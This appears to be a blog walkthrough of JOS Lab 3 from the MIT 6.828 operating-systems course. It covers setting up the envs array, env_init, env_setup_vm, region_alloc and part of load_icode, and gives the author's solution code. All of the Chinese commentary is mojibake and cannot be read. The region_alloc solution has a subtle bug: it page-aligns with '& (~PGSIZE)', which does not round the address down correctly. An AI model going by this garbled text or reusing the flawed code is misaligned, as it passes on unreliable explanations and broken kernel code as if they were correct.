<code>kern/pmap.c</code> to allocate and map the <code>envs</code> array. This array consists of exactly <code>NENV</code> instances of the <code>Env</code> structure allocated much like how you allocated the <code>pages</code> array. Also like the <code>pages</code> array, the memory backing <code>envs</code> should also be mapped user read-only at <code>UENVS</code> (defined in <code>inc/memlayout.h</code>) so user processes can read from this array.</p><p>You should run your code and make sure <code>check_kern_pgdir()</code> succeeds.</p></blockquote><p>æ³¨æ„åº”åœ¨ <code>page_init()</code> ä¹‹å‰è°ƒç”¨ <code>boot_alloc()</code> åˆ†é…ç©ºé—´ï¼Œåœ¨è¿™ä¹‹åå†è¿›è¡Œæ˜ å°„ï¼Œä¸è¦å›¾çœäº‹å†™åˆ°ä¸€èµ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Make &#x27;envs&#x27; point to an array of size &#x27;NENV&#x27; of &#x27;struct Env&#x27;.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>envs = boot_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV);<br><span class="hljs-built_in">memset</span>(envs, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map the &#x27;envs&#x27; array read-only by the user at linear address UENVS</span><br><span class="hljs-comment">// (ie. perm = PTE_U | PTE_P).</span><br><span class="hljs-comment">// Permissions:</span><br><span class="hljs-comment">//    - the new image at UENVS  -- kernel R, user R</span><br><span class="hljs-comment">//    - envs itself -- kernel RW, user NONE</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>boot_map_region(kern_pgdir, UENVS, <br>ROUNDUP(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV, PGSIZE), <br>PADDR(envs), PTE_U);<br></code></pre></td></tr></table></figure><h3 id="Creating-and-Running-Environments">Creating and Running Environments</h3><p>æˆ‘ä»¬å°†åœ¨ <code>kern/env.c</code> ä¸­ç¼–å†™è¿è¡Œç”¨æˆ·ç¯å¢ƒæ‰€éœ€çš„ä»£ç ï¼Œå› ä¸ºç›®å‰è¿˜æ²¡æœ‰æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥ç›®å‰ä¸´æ—¶çš„ä¸€ä¸ªåšæ³•æ˜¯å°†ä¸€ä¸ª ELF æ–‡ä»¶ä»¥ raw æ ¼å¼ï¼ˆé“¾æ¥å†…æ ¸æ—¶ä½¿ç”¨ <code>-b binary</code> é€‰é¡¹ï¼‰åµŒå…¥åˆ°å†…æ ¸é•œåƒä¸­ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬èƒ½åœ¨å†…æ ¸ç¬¦å·æ–‡ä»¶ <code>obj/kern/kernel.sym</code> ä¸­è§åˆ°ä¸€äº›å¥‡æ€ªç¬¦å·çš„ç¼˜æ•…ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå®éªŒä¸€å¼€å§‹ç¬”è€…åç¼–è¯‘å†…æ ¸é•œåƒè§åˆ°å¥‡æ€ªçš„ç¬¦å·çš„ç¼˜æ•…</p><p><img src="https://s2.loli.net/2022/03/16/w3GDsF2iCI1BVkd.png" alt="image.png"></p><p>åœ¨ <code>kern/init.c</code> ä¸­çš„ <code>i386_init()</code> ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯åŠ¨ç”¨æˆ·è¿›ç¨‹çš„ä»£ç ï¼Œç„¶è€Œè®¾ç½®ç”¨æˆ·è¿›ç¨‹çš„ä»£ç å°šæœªå®Œå·¥ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦å®Œæˆçš„â€”â€”Exercise2ï¼š</p><blockquote><p><strong>Exercise 2.</strong> In the file <code>env.c</code>, finish coding the following functions:</p><ul><li><p><code>env_init()</code></p><p>Initialize all of the <code>Env</code> structures in the <code>envs</code> array and add them to the <code>env_free_list</code>. Also calls <code>env_init_percpu</code>, which configures the segmentation hardware with separate segments for privilege level 0 (kernel) and privilege level 3 (user).</p></li><li><p><code>env_setup_vm()</code></p><p>Allocate a page directory for a new environment and initialize the kernel portion of the new environmentâ€™s address space.</p></li><li><p><code>region_alloc()</code></p><p>Allocates and maps physical memory for an environment</p></li><li><p><code>load_icode()</code></p><p>You will need to parse an ELF binary image, much like the boot loader already does, and load its contents into the user address space of a new environment.</p></li><li><p><code>env_create()</code></p><p>Allocate an environment with <code>env_alloc</code> and call <code>load_icode</code> to load an ELF binary into it.</p></li><li><p><code>env_run()</code></p><p>Start a given environment running in user mode.</p></li></ul><p>As you write these functions, you might find the new cprintf verb <code>%e</code> useful â€“ it prints a description corresponding to an error code. For example,</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">r</span> = <span class="hljs-literal">-E_NO_MEM</span>;<br>panic(<span class="hljs-string">&quot;env_alloc: %e&quot;</span>, <span class="hljs-built_in">r</span>);<br></code></pre></td></tr></table></figure><p>will panic with the message â€œenv_alloc: out of memoryâ€.</p></blockquote><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹å®éªŒè¯´æ˜æä¾›ç»™æˆ‘ä»¬çš„ä¸€ä¸ªå†…æ ¸è¿è¡Œé“¾ï¼š</p><ul><li><code>start</code> (<code>kern/entry.S</code>)</li><li><code>i386_init</code> (<code>kern/init.c</code>)<ul><li><code>cons_init</code></li><li><code>mem_init</code></li><li><code>env_init</code></li><li><code>trap_init</code> (still incomplete at this point)</li><li><code>env_create</code></li><li><code>env_run</code><ul><li><code>env_pop_tf</code></li></ul></li></ul></li></ul><p>ç°åœ¨å¼€å§‹è¡¥å…¨å®éªŒä»£ç ã€‚</p><h4 id="env-init-ï¼šåˆå§‹åŒ–-Env-ç»“æ„ä½“ï¼Œå»ºç«‹-freelist">env_init()ï¼šåˆå§‹åŒ– Env ç»“æ„ä½“ï¼Œå»ºç«‹ freelist</h4><p>é¦–å…ˆçœ‹ <code>env_init()</code> å‡½æ•°çš„æ³¨é‡Šï¼Œä¸»è¦æ˜¯å°† envs æ•°ç»„ä¸­æ‰€æœ‰ Env ç»“æ„ä½“é“¾åˆ° <code>env_free_list</code> ä¸Šï¼Œå¹¶ç¡®ä¿ä¸æ•°ç»„ç›¸åŒçš„ä»å‰å‘åçš„è¿æ¥é¡ºåº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Mark all environments in &#x27;envs&#x27; as free, set their env_ids to 0,</span><br><span class="hljs-comment">// and insert them into the env_free_list.</span><br><span class="hljs-comment">// Make sure the environments are in the free list in the same order</span><br><span class="hljs-comment">// they are in the envs array (i.e., so that the first call to</span><br><span class="hljs-comment">// env_alloc() returns envs[0]).</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>åå‘éå† envs æ•°ç»„å»ºç«‹å•å‘é“¾è¡¨å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// Set up envs array</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-type">int</span> i;<br><br>env_free_list = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">for</span> (i = NENV - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>envs[i].env_id = <span class="hljs-number">0</span>;<br>envs[i].env_status = ENV_FREE;<br>envs[i].env_link = env_free_list;<br>env_free_list = &amp;envs[i];<br>&#125;<br><br><span class="hljs-comment">// Per-CPU part of the initialization</span><br>env_init_percpu();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="env-setup-vm-ï¼šåˆ†é…è¿›ç¨‹ç¯å¢ƒèµ„æº">env_setup_vm()ï¼šåˆ†é…è¿›ç¨‹ç¯å¢ƒèµ„æº</h4><p>æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬åˆ†é…ç”¨æˆ·è¿›ç¨‹æ‰€éœ€èµ„æºï¼šå°±ç›®å‰è€Œè¨€åªæ˜¯åˆ†é…ä¸€ä¸ªé¡µç›®å½•è¡¨ï¼Œå¹¶å»ºç«‹å¯¹åº”çš„å†…æ ¸å…¥å£ç‚¹çš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Initialize the kernel virtual memory layout for environment e.</span><br><span class="hljs-comment">// Allocate a page directory, set e-&gt;env_pgdir accordingly,</span><br><span class="hljs-comment">// and initialize the kernel portion of the new environment&#x27;s address space.</span><br><span class="hljs-comment">// Do NOT (yet) map anything into the user portion</span><br><span class="hljs-comment">// of the environment&#x27;s virtual address space.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns 0 on success, &lt; 0 on error.  Errors include:</span><br><span class="hljs-comment">//-E_NO_MEM if page directory or table could not be allocated.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>æ‰€æœ‰çš„è¿›ç¨‹å…±äº«åŒä¸€ä»½å†…æ ¸ç©ºé—´ï¼ˆ<code>UTOP</code> å¾€ä¸Šçš„è™šæ‹Ÿç©ºé—´ï¼‰ï¼Œé™¤äº†<code>UVPT</code>â€”â€”æ¯ä¸ªè¿›ç¨‹å„è‡ªåº”å½“æœ‰ä¸€ä»½ç‹¬ç«‹çš„é¡µç›®å½•è¡¨ï¼Œå› æ­¤åœ¨è¯¥å‡½æ•°ä¸­æˆ‘ä»¬éœ€è¦åˆå§‹åŒ–å•ä¸ªè¿›ç¨‹çš„é¡µè¡¨å¯¹å†…æ ¸ç©ºé—´çš„æ˜ å°„ï¼Œå‚ç…§ <code>inc/memlayout.h</code> ä¸­çš„å¸ƒå±€</p><p>åœ¨ JOS ä¸­å…¶å®æ˜¯ç±»ä¼¼äºæ™®é€š OS ä»¥å‰çš„åšæ³•ï¼šæ¯ä¸ªè¿›ç¨‹å…±äº«ä¸€ä»½å®Œæ•´çš„å†…æ ¸åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œä½†ç¬”è€…è®¤ä¸ºå…¶å®æˆ‘ä»¬åªéœ€è¦æ˜ å°„åªè¯»çš„ pages æ•°ç»„ä¸ envs æ•°ç»„å³å¯ï¼Œ<strong>å†…æ ¸çš„å…¶ä»–åŒºåŸŸç”¨æˆ·æ˜¯æ²¡æœ‰ä»»ä½•è®¿é—®æƒé™çš„ï¼Œé‚£å…¶å®æ²¡å¿…è¦å»ºç«‹æ˜ å°„</strong>ï¼Œç¬”è€…è®¤ä¸ºæ¯”è¾ƒç†æƒ³çš„ä¸€ä¸ªçŠ¶æ€æ˜¯ç±»ä¼¼ KPTI é‚£æ ·çš„â€”â€”ç”¨æˆ·æ€ä¸å†…æ ¸æ€å„è‡ªæœ‰ä¸€å¼ é¡µè¡¨ï¼Œå…¶ä¸­å†…æ ¸æ€é¡µè¡¨å®Œæ•´æ˜ å°„å†…æ ¸ç©ºé—´ï¼Œç”¨æˆ·æ€é¡µè¡¨ä»…æ˜ å°„å†…æ ¸å…¥å£ç‚¹ï¼ŒåŒæ—¶ä¸¤å¼ é¡µè¡¨éƒ½å®Œæ•´æ˜ å°„ç”¨æˆ·ç©ºé—´</p><p>è¿™å¹¶éä¸èƒ½å®ç°ï¼Œä½†æ˜¯<strong>è¿™æˆ–è®¸éœ€è¦å¯¹ JOS æºç è¿›è¡Œç›¸å½“å¤§çš„æ”¹åŠ¨ï¼Œä¸”è¯¥å‡½æ•°é™¤äº†åˆ›å»ºç”¨æˆ·è¿›ç¨‹ä»¥å¤–è¿˜æ‰¿æ‹…äº†åˆ›å»ºå†…æ ¸è¿›ç¨‹çš„ä»»åŠ¡ï¼Œè€Œåè€…æ˜¯éœ€è¦å¯¹å†…æ ¸ç©ºé—´æœ‰è®¿é—®æƒé™çš„</strong>ï¼Œä¸” KPTI ç¡®ä¹ä¼šå¸¦æ¥ä¸€å®šçš„å¼€é”€ï¼ˆä½†æ˜¯å¯ä»¥é˜²æ­¢ç†”æ–­ä¸å¹½çµæ¼æ´çš„æ”»å‡»ï¼Œå¯èƒ½ä½œä¸ºä¸€ä¸ªå®‰å…¨ç ”ç©¶å‘˜ç¬¬ä¸€æƒ³åˆ°çš„å¹¶ä¸æ˜¯æ€§èƒ½è€Œæ˜¯å®‰å…¨æ€§ï¼‰ï¼Œå› æ­¤è¿™é‡Œç¬”è€…è¿˜æ˜¯é€‰æ‹©è€è€å®å®åœ°å®Œæ•´æ‹·è´ä¸€ä»½å†…æ ¸é¡µè¡¨</p><blockquote><p>è¿™é‡Œåˆ«å¿˜äº† page_alloc() åˆ†é…çš„æ˜¯ page ç»“æ„ä½“çš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨è½¬ä¸ºè™šæ‹Ÿåœ°å€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">env_setup_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">p</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// Allocate a page for the page directory</span><br><span class="hljs-keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))<br><span class="hljs-keyword">return</span> -E_NO_MEM;<br><br><span class="hljs-comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint:</span><br><span class="hljs-comment">//    - The VA space of all envs is identical above UTOP</span><br><span class="hljs-comment">//(except at UVPT, which we&#x27;ve set below).</span><br><span class="hljs-comment">//See inc/memlayout.h for permissions and layout.</span><br><span class="hljs-comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span><br><span class="hljs-comment">//(Make sure you got the permissions right in Lab 2.)</span><br><span class="hljs-comment">//    - The initial VA below UTOP is empty.</span><br><span class="hljs-comment">//    - You do not need to make any more calls to page_alloc.</span><br><span class="hljs-comment">//    - Note: In general, pp_ref is not maintained for</span><br><span class="hljs-comment">//physical pages mapped only above UTOP, but env_pgdir</span><br><span class="hljs-comment">//is an exception -- you need to increment env_pgdir&#x27;s</span><br><span class="hljs-comment">//pp_ref for env_free to work correctly.</span><br><span class="hljs-comment">//    - The functions in kern/pmap.h are handy.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>p-&gt;pp_ref++;<br><br><span class="hljs-comment">// copy kernel pgdir</span><br><span class="hljs-built_in">memcpy</span>(page2kva(p), kern_pgdir, PGSIZE);<br><br>e-&gt;env_pgdir = page2kva(p);<br><br><span class="hljs-comment">// UVPT maps the env&#x27;s own page table read-only.</span><br><span class="hljs-comment">// Permissions: kernel R, user R</span><br>e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è€Œä¸”ä»”ç»†æƒ³æ¥ï¼ŒKPTIå¹¶éæ˜¯åŸºäºå®‰å…¨æ€§çš„æ”¹è¿›ï¼Œ<strong>è€Œæ˜¯å¯¹æ¼æ´ä¸å¾—ä¸åšå‡ºçš„å¦¥å</strong>ï¼Œå†µä¸”è¿™ä¹Ÿå°±åªæ˜¯åšä¸ªå®éªŒè€Œå·²ï¼Œæš‚æ—¶è¿˜æ˜¯ä¸å¤§å¼ æ——é¼“åœ°æ”¹äº†</p></blockquote><h4 id="region-alloc-ï¼šä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†é¡µé¢ï¼Œå»ºç«‹æ˜ å°„">region_alloc()ï¼šä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†é¡µé¢ï¼Œå»ºç«‹æ˜ å°„</h4><p>ä¸»è¦æ˜¯ä¸ºç”¨æˆ·è¿›ç¨‹çš„ va èµ·å§‹å¤„ len é•¿åº¦çš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†é…ç‰©ç†é¡µé¢ï¼Œåˆ«å¿˜äº†å¤§å°æŒ‰é¡µé¢ç²’åº¦å¯¹é½ä»¥åŠé¡µè¡¨é¡¹ç”¨æˆ·å¯å†™æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocate len bytes of physical memory for environment env,</span><br><span class="hljs-comment">// and map it at virtual address va in the environment&#x27;s address space.</span><br><span class="hljs-comment">// Does not zero or otherwise initialize the mapped pages in any way.</span><br><span class="hljs-comment">// Pages should be writable by user and kernel.</span><br><span class="hljs-comment">// Panic if any allocation attempt fails.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">region_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e, <span class="hljs-type">void</span> *va, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-comment">// (But only if you need it for load_icode.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: It is easier to use region_alloc if the caller can pass</span><br><span class="hljs-comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span><br><span class="hljs-comment">//   You should round va down, and round (va + len) up.</span><br><span class="hljs-comment">//   (Watch out for corner-cases!)</span><br><span class="hljs-type">size_t</span> start, end;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">new_p</span>;</span><br><br>start = ((<span class="hljs-type">size_t</span>)va) &amp; (~PGSIZE);<br>end = ROUNDUP((<span class="hljs-type">size_t</span>)va + len, PGSIZE);<br><br><span class="hljs-keyword">for</span> (; start &lt; end; start += PGSIZE)<br>&#123;<br>new_p = page_alloc(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!new_p)<br>panic(<span class="hljs-string">&quot;Out of memory while allocating region for env!&quot;</span>);<br>new_p-&gt;pp_ref++;<br><span class="hljs-keyword">if</span>(page_insert(e-&gt;env_pgdir, new_p, (<span class="hljs-type">void</span>*)start, PTE_U | PTE_W))<br>panic(<span class="hljs-string">&quot;OOM while inserting page into page table!&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="load-icode-ï¼šè§£æ-ELF-æ–‡ä»¶ï¼Œä½œä¸ºæ–°è¿›ç¨‹è½½å…¥">load_icode()ï¼šè§£æ ELF æ–‡ä»¶ï¼Œä½œä¸ºæ–°è¿›ç¨‹è½½å…¥</h4><p>å…ˆçœ‹æ³¨é‡Šï¼Œè®©æˆ‘ä»¬æ‰‹å†™ä¸€ä¸ª ELF è§£æå™¨ï¼Œä¸ºå„ä¸ªå­˜åœ¨äº ELF ä¸­çš„æ®µåˆ†é…ç©ºé—´ï¼ˆä¾‹å¦‚ bss æ®µåœ¨ ELF ä¸­å°±ä¸å ç©ºé—´ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Set up the initial program binary, stack, and processor flags</span><br><span class="hljs-comment">// for a user process.</span><br><span class="hljs-comment">// This function is ONLY called during kernel initialization,</span><br><span class="hljs-comment">// before running the first user-mode environment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function loads all loadable segments from the ELF binary image</span><br><span class="hljs-comment">// into the environment&#x27;s user memory, starting at the appropriate</span><br><span class="hljs-comment">// virtual addresses indicated in the ELF program header.</span><br><span class="hljs-comment">// At the same time it clears to zero any portions of these segments</span><br><span class="hljs-comment">// that are marked in the program header as being mapped</span><br><span class="hljs-comment">// but not actually present in the ELF file - i.e., the program&#x27;s bss section.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// All this is very similar to what our boot loader does, except the boot</span><br><span class="hljs-comment">// loader also needs to read the code from disk.  Take a look at</span><br><span class="hljs-comment">// boot/main.c to get ideas.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Finally, this function maps one page for the program&#x27;s initial stack.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// load_icode panics if it encounters problems.</span><br><span class="hljs-comment">//  - How might load_icode fail?  What might be wrong with the given input?</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦è¿˜æ˜¯è‹¦åŠ›æ´»ï¼Œè§£æ ELF headerï¼Œé€‰å‡ºå¯è½½å…¥æ®µï¼ˆ<code>ph-&gt;p_type == ELF_PROG_LOAD</code>ï¼‰ï¼Œåˆ†é…å†…å­˜ï¼Œåœ¨é¡µè¡¨ä¸­å»ºç«‹æ˜ å°„ï¼Œä¸è¿‡è¿™é‡Œæç¤ºæˆ‘ä»¬å¯ä»¥æŠ„ä¸€æŠ„ <code>boot/main.c</code> ä¸­çš„è§£ææ–¹æ³•ï¼ˆ<s>é‚£ğŸ‘´å½“ç„¶è¦æŠ„ğŸŒ¶</s>ï¼‰</p><blockquote><p>å…³äº ELF æ ¼å¼ç½‘ä¸Šå¤§æŠŠèµ„æ–™ï¼Œä¸ä¼šçš„å¯ä»¥å‚è§ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%83%E3%80%81%E5%8F%AF%E6%89%A7%E8%A1%8C-ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B5%85%E6%9E%90</a></p></blockquote><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬ä»…éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹æ˜ å°„ï¼Œè€Œæˆ‘ä»¬åœ¨åˆ†é…å®Œç©ºé—´ä¹‹åè¿˜éœ€è¦å°†æ•°æ®æ‹·è´ä¸Šå»ï¼Œè€ƒè™‘åˆ°ç”¨æˆ·ç©ºé—´é¡µè¡¨ä¸­ä¹Ÿæ˜ å°„äº†å†…æ ¸ç©ºé—´ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å…ˆåˆ‡æ¢åˆ°ç”¨æˆ·é¡µè¡¨å¤„ç†æ•°æ®ï¼Œå®Œæˆä¹‹åå†åˆ‡æ¢å›å†…æ ¸é¡µè¡¨</strong>ï¼Œåœ¨ JOS ä¸­æä¾›äº†ä¸€ä¸ª <code>lcr3()</code> è®©æˆ‘ä»¬èƒ½ç›´æ¥æ›´æ”¹ cr3 å¯„å­˜å™¨çš„å€¼ï¼ˆè¯¥å¯„å­˜å™¨ä¸­å­˜æ”¾ç€é¡µç›®å½•è¡¨çš„åœ°å€ï¼‰</p><p>åˆ«å¿˜äº†å°† ELF header ä¸­çš„ entry ï¼ˆ<strong>ç¨‹åºå…¥å£ç‚¹</strong>ï¼‰ç»™åˆ° Env ç»“æ„ä½“ä¸­å¯„å­˜å™¨ç»“æ„ä½“çš„ eip</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e, <span class="hljs-type">uint8_t</span> *binary)</span><br>&#123;<br><span class="hljs-comment">// Hints:</span><br><span class="hljs-comment">//  Load each program segment into virtual memory</span><br><span class="hljs-comment">//  at the address specified in the ELF segment header.</span><br><span class="hljs-comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span><br><span class="hljs-comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span><br><span class="hljs-comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span><br><span class="hljs-comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting 